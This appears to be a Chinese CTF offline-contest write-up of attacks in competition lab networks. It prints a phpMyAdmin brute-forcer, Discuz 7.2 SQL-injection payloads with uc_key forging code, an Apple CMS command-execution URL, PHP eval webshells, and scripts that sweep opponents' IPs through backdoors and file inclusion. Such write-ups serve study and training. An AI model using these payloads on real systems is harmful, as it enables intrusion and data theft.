@@ -1,0 +1,426 @@
+# 两次ctf线下赛渗透测试及攻防记录
+
+阅读量 **313597**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2018-02-23 10:02:59
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+> 本篇原创文章参加双倍稿费活动，预估稿费为800元，活动链接请点[此处](https://www.anquanke.com/post/id/98410)
+
+> 本文主要记录某两次线下赛的部分解题过程。涉及预留后门、sql注入等知识点，做了一些解题记录分享给大家。
+
+## 线下赛1
+
+###  渗透靶机1—10.10.10.131
+
+使用nessus扫描靶机，发现靶机存在ms17-010漏洞，这个是永恒之蓝的漏洞  
+于是使用metasploit进行攻击
+
+![](https://p5.ssl.qhimg.com/t014c7be1a24b9e89af.png)
+
+###  渗透靶机2—10.10.10.254
+
+0x01御剑扫描发现存在phpmyadmin目录，并且可以访问，抓包分析请求包，然后写python脚本进行登录爆破。  
+请求包是这样的，留意红色框框，base64解码之后可以发现其实就是我输入的用户名和密码、
+
+![](https://p0.ssl.qhimg.com/t01c8acd9d4cec6e225.png)
+
+![](https://p2.ssl.qhimg.com/t01c9b2f35eb738ea67.png)
+
+直接使用burp爆破后被限制访问，后来知道它限制了使用burp爆破，于是写脚本爆破[代码]
+
+    
+    
+    #coding=utf-8
+    import requests
+    import base64
+    
+    def get_b64_u_p(passwdFile): 
+        username='root'
+        pF=open(passwdFile,'r')
+        for line in pF.readlines():
+            password=line.strip('r').strip('n')
+            print "[+] Trying: "+username+"/"+password
+            if(login(base64.b64encode(username+':'+password))):
+                break
+    
+    def login(b64_u_p):
+        url="http://10.10.10.254/phpMyAdmin/";
+        headers={
+            'Host': '10.10.10.254',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+            'Cookie': 'phpMyAdmin=905a110bc7a3544de32bc6bd01a88c7e78236bf8; pma_lang=zh-utf-8; pma_charset=utf-8; pma_collation_connection=utf8_general_ci; pma_fontsize=82%25; pma_theme=original; tz_offset=28800',
+            'Connection': 'close',
+            'Upgrade-Insecure-Requests': '1',
+            'Authorization': 'Basic '+b64_u_p   #cm9vdDphYWFh
+        }
+        req=requests.get(url=url,headers=headers)
+        if "错误" not in req.content:
+            print '[#]Find username/password : '+base64.b64decode(b64_u_p)
+            return 1
+        return 0
+    
+    get_b64_u_p('password.txt')
+    
+
+结果  
+
+于是直接登进phpmyadmin写shell  
+select ‘<?php [@eval](https://github.com/eval "@eval")($_POST[a]);?>’ into
+outfile ‘/var/www/a.php’  
+后面可以知道这是我们的攻防机  
+并得到后台密码，后台密码也是ssh的登录密码
+
+###  攻防—渗透其他队伍的内网攻防机
+
+利用攻防机10.10.10.254作为跳板机渗透其他队伍的内网攻防机192.168.10.128  
+这台攻防机有两个网卡ip分别是10.10.10.254和192.168.10.254  
+
+其他选手的攻防机所在的网段是192.168.xx.xx  
+这里需要知道的是因为选手机所在的网段是10.10.xx.xx是没办法直接访问网段192.168.xx.xx的，所以要攻击对手的话我们需要使用我们自己的一台攻防机来作为攻击的跳板机，其中有一台我后面发现存在ms10_002_aurora漏洞，这是一个浏览器漏洞。因为所有队伍攻防机的初始配置都是一样的，所以我后面想到利用这个漏洞，
+利用思路是:  
+先在自己的攻防机192.168.10.254上面挂一个ms10_002_aurora漏洞利用的黑页，然后如果对手使用了跳板机上有浏览器漏洞的机子访问了我们的攻防机192.168.10.254的话，就会触发漏洞反弹一个shell给我们。
+
+**利用过程如下**
+
+例如对手的一台存在该漏洞的跳板机是192.168.10.128  
+我们先挂载上漏洞利用的网页在我们的10.10.10.128:8080/exploit  
+
+然后我们在自己的攻防机10.10.10.254上的index.html中添加上一句iframe  
+(也就是挂载上了192.168.10.254这台攻防机上)  
+
+然后对手的一台存在该漏洞的跳板机192.168.10.128访问了我们的192.168.10.254这台攻防机  
+(因为对手要攻击我们的攻防机获取flag，所以对手一般都会使用跳板机的浏览器去访问我们攻防机的web网站)  
+这时候就会触发漏洞反弹一个shell给我们，由此我们就成功渗透进了对手的192.168.10.128这台内网机子。  
+
+## 线下赛2
+
+###  环境说明
+
+拓扑图  
+
+拓扑图是主办方在后阶段发的，刚开始的网络结果全部要自己去探测。  
+比赛是渗透+AWD攻防模式，一个队伍有十台信息点靶机(用户名为info1-info10)和5台攻防机(用户名score1-score5)，要先渗透进自己的信息点机才能够进一步渗透进自己的攻防机，是个多级内网的结构。
+
+**主要思路就是:**
+
+> 渗透进信息点机获取相应的flag和信息，然后渗透进自己的攻防机，然后在跳板机上对其他队伍进行攻击渗透。
+
+###  渗透info4—ip 192.1.1.14
+
+这是一个discuz7.2的网站  
+自己电脑的ip为192.1.1.1
+
+faq.php文件存在sql注入，sql注入的原理参考  
+<https://www.waitalone.cn/discuz72-faq-sql-injection.html>  
+在Discuz中，uc_key是UC客户端与服务端通信的通信密钥，获取到uc_key之后就可以计算出code,导致
+/api/uc.php中存在代码写入漏洞。  
+这题拿shell主要思路是:获取uc key然后计算出code最后xml注入getshell  
+(为了更好的说明，附上本人复现的截图)  
+uc_key长度为64位，需要注入两次才能拿到完整的uc_key  
+payload  
+获取前62位  
+faq.php?action=grouppermission&gids[99]=’&gids[100][0]=) and (select 1 from
+(select count( _),concat(floor(rand(0)_ 2),0x23,(select substr(authkey,1,62)
+from ucenter.uc_applications limit 0,1),0x23)x from information_schema.tables
+group by x)a)%23  
+
+获取最后两位  
+faq.php?action=grouppermission&gids[99]=’&gids[100][0]=) and (select 1 from
+(select count( _),concat(floor(rand(0)_ 2),0x23,(select substr(authkey,63,2)
+from ucenter.uc_applications limit 0,1),0x23)x from information_schema.tables
+group by x)a)%23  
+
+最后获得uc_key为  
+m5B4W93cV8ebvfb392l7Ias8PeLcl9LbSc29LeZcP9i6kc08t4X4u85bHbma77Dc
+
+计算出code [代码]
+
+    
+    
+    <?php
+    $timestamp = time()+10*3600;
+    $host="http://10.10.10.1/Discuz_7.2_SC_UTF8/upload";
+    $uc_key="m5B4W93cV8ebvfb392l7Ias8PeLcl9LbSc29LeZcP9i6kc08t4X4u85bHbma77Dc";
+    $code=urlencode(_authcode("time=$timestamp&action=updateapps", 'ENCODE', $uc_key));
+    echo $code;
+    
+    function _authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) 
+    {
+        $ckey_length = 4;
+        $key = md5($key ? $key : UC_KEY);
+        $keya = md5(substr($key, 0, 16));
+        $keyb = md5(substr($key, 16, 16));
+        $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
+        $cryptkey = $keya.md5($keya.$keyc);
+        $key_length = strlen($cryptkey); 
+        $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
+        $string_length = strlen($string); 
+        $result = '';
+        $box = range(0, 255); 
+        $rndkey = array();
+        for($i = 0; $i <= 255; $i++) 
+        {
+            $rndkey[$i] = ord($cryptkey[$i % $key_length]);
+        }
+        for($j = $i = 0; $i < 256; $i++) 
+        {
+            $j = ($j + $box[$i] + $rndkey[$i]) % 256;
+            $tmp = $box[$i];
+            $box[$i] = $box[$j];
+            $box[$j] = $tmp;
+        }
+        for($a = $j = $i = 0; $i < $string_length; $i++) 
+        {
+            $a = ($a + 1) % 256;
+            $j = ($j + $box[$a]) % 256;
+            $tmp = $box[$a];
+            $box[$a] = $box[$j];
+            $box[$j] = $tmp;
+            $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
+        }
+        if($operation == 'DECODE') 
+        {
+            if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) 
+            {
+                return substr($result, 26);
+            } 
+            else 
+                {return '';}
+    
+        } 
+        else 
+            {return $keyc.str_replace('=', '', base64_encode($result));}
+    
+    }
+    ?>
+    
+
+抓包/api/uc.php 并填写上相应的code的值，以及加上xml注入的数据  
+
+一句话的路径在<http://192.1.1.14/config.inc.php> ，密码是cmd  
+于是可以获取到信息点的flag
+
+使用下列语句注入出info4的后台登录账号密码和盐salt的值  
+/faq.php?action=grouppermission&gids[99]=’&gids[100][0]=) and (select 1 from
+(select count( _),concat((select concat(username,0x3a,password,0x3a,salt,0x23)
+from ucenter.uc_members limit 0,1),floor(rand(0)_ 2))x from
+information_schema.tables group by x)a)%23  
+得到  
+info4:6f6decc4a51d89665f38cec4bc0ca97d:e114251  
+密码的加密方式是  
+$salt = substr(uniqid(rand()), -6);//随机生成长度为6的盐  
+$password = md5(md5($password).$salt);//discuz中密码的加密方式  
+直接拿去md5网站解密得到rampage  
+后来发现这个账号密码也是info4的ssh的登录账号密码
+
+###  渗透info1—苹果cms ip为192.1.1.11
+
+存在命令执行漏洞  
+漏洞原理参见<https://www.cnblogs.com/test404/p/7397755.html>  
+getshell的payload是  
+[http://192.1.1.11/index.php?m=vod-search&wd={if-A:assert($_POST[a])}{endif-A}](http://192.1.1.11/index.php?m=vod-search&wd=%7Bif-A:assert\(%24_POST%5Ba%5D\)%7D%7Bendif-A%7D)  
+得到webshell之后可以看到score1shadow_backup文件和  
+password_is_phone_num13993xxxxxx，知道密码开头的五位数是13993  
+然后shadow文件里面是score1的密码密文  
+$6$xNmo17Zn$4GqSN/zccHMud9uJgY7kGhU4W.ss4fMxQ9yNsQ/oWubYWE0xHf9.BuD5umI0wUhj8s2J1kH0L0JfhFEKu8u52/:17465:0:99999:7:::  
+然后写脚本生成6位数的字典  
+[代码]
+
+    
+    
+    f=open('zidian.txt','w')
+    for i in range(0,1000000):
+        length=len(str(i))
+        if(length==1):
+            tmp='00000'+str(i)
+        if(length==2):
+            tmp='0000'+str(i)
+        if(length==3):
+            tmp='000'+str(i)
+        if(length==4):
+            tmp='00'+str(i)
+        if(length==5):
+            tmp='0'+str(i)
+        if(length==6):
+            tmp=str(i)
+        f.write('13993'+tmp+'r')
+    
+    f.close()
+    
+
+再使用john工具爆破得到密码明文  
+破解shadow的命令  
+john —wordlist 字典文件 shadow文件  
+john —wordlist zidian.txt shadow.txt
+
+然后查看数据库配置文件，有注释说这是从info2迁移的，连接数据库是info2用户，得到info2的密码为call911，然后登录上info2后在home目录发现mysql
+history，打开后发现是创建了一个info8的用户，密码为arkteam。
+
+## 攻防
+
+###  score1上是一个wordpress 4.7.x的网站
+
+####  1.预留后门
+
+<?php [@eval](https://github.com/eval "@eval")($_GET[‘cmd’]); ?>  
+exp[代码]
+
+    
+    
+    import requests
+    part_url="/wp-includes/rest-api/endpoints/class-wp-rest-relations-controller.php?cmd=system('cat /opt/xnuca/flag.txt');"
+    for i in range(1,22):
+        try:
+            ip1='192.121.'+str(i)+'.31'
+            ip='http://192.121.'+str(i)+'.31'
+            full_url=ip+part_url
+            res=requests.get(url=full_url,timeout=2)
+            # print res.status_code
+            if res.status_code!=404:
+                print ip1
+                print res.text
+        except Exception,e:
+            pass
+    
+
+####  2.文件包含漏洞
+
+漏洞文件/wp-content/plugins/wp-vault/trunk/wp-vault.php  
+参数wpv-image存在文件包含，漏洞关键代码如下[代码]
+
+    
+    
+    // Load CSS, JS files, or invoke file handler.
+    function wpv_init() {
+        if (isset($_GET["wpv_file_id"])) {
+            include(dirname(__FILE__) . "/wpv-file-handler.php");
+            exit;
+        }
+        else if (isset($_POST["wpv-tooltip"])) {
+            include(dirname(__FILE__) . "/ajax-response/wpv-tooltip.php");
+            exit;
+        }
+        else if (isset($_GET["wpv-image"])) {
+            include(dirname(__FILE__) . "/images/" . $_GET["wpv-image"]);
+            exit;
+        }
+        else if (isset($_GET["wpv-css"])) {
+            if (file_exists(dirname(__FILE__) . "/css/" . $_GET["wpv-css"] . ".css")) {
+                header("Content-type: text/css");
+                include(dirname(__FILE__) . "/css/" . $_GET["wpv-css"] . ".css");
+                exit;
+            }
+            else if (file_exists(dirname(__FILE__) . "/css/" . $_GET["wpv-css"] . ".css.php")) {
+                header("Content-type: text/css");
+                include(dirname(__FILE__) . "/css/" . $_GET["wpv-css"] . ".css.php");
+                exit;
+            }
+        }
+    
+
+文件包含利用exp[代码]
+
+    
+    
+    import requests
+    part_url='/wp-content/plugins/wp-vault/trunk/wp-vault.php?wpv-image=../../../../../opt/xnuca/flag.txt'
+    for i in range(1,22):
+        try:
+            ip1='192.121.'+str(i)+'.31'
+            ip='http://192.121.'+str(i)+'.31'
+            full_url=ip+part_url
+            res=requests.get(url=full_url,timeout=2)
+            # print res.status_code
+            if res.status_code!=404:
+                print ip1
+                print res.text
+        except Exception,e:
+            pass
+    
+
+####  3.kittycatfish 2.2插件 存在sql注入
+
+注入点1 ：/wp-content/plugins/kittycatfish/base.css.php?kc_ad=31&ver=2.0  
+注入点2：wp-content/plugins/kittycatfish/kittycatfish.php?kc_ad=37&ver=2.0  
+都是kc_ad参数，可以使用盲注直接load_file读取flag文件
+
+####  4\. olimometer插件存在sql注入
+
+注入点：/wp-content/plugins/olimometer/thermometer.php?olimometer_id=1
+olimometer_id参数可以盲注直接load_file读取flag文件
+
+####  5\. easy-modal插件存在sql注入
+
+同样存在sql盲注，但是首先得登录进后台才能利用
+
+###  score4是一个joomla3.x网站
+
+####  1.存在变形的预留后门
+
+<?php ($ _=@$_GET[2]).@$_ ($_POST[1])?>  
+路径在/components/com_facegallery/controllers/update.php  
+利用payload  
+?2=assert post system(‘cat /opt/xnuca/flag.txt’);  
+exp [代码]
+
+    
+    
+    import requests
+    shell='/components/com_facegallery/controllers/update.php?2=assert'
+    for i in range(1,22):
+        try:
+            ip='http://192.121.'+str(i)+'.34'
+            full_url=ip+shell
+            print ip
+            post_data={"1":"system('cat /opt/xnuca/flag.txt');"}
+            res=requests.post(url=full_url,data=post_data)
+            # print res.status_code
+            print res.text
+        except Exception,e:
+            pass
+    
+
+###  小弟能力有限，欢迎各位大师傅们补充。
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **windy** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/98653](/post/id/98653)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [渗透测试](/tag/渗透测试)
+  * [ctf线下赛](/tag/ctf线下赛)
+
+ **+1** __0赞
+
+ __收藏
+
+![](https://p5.ssl.qhimg.com/t010857340ce46bb672.jpg) windy
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
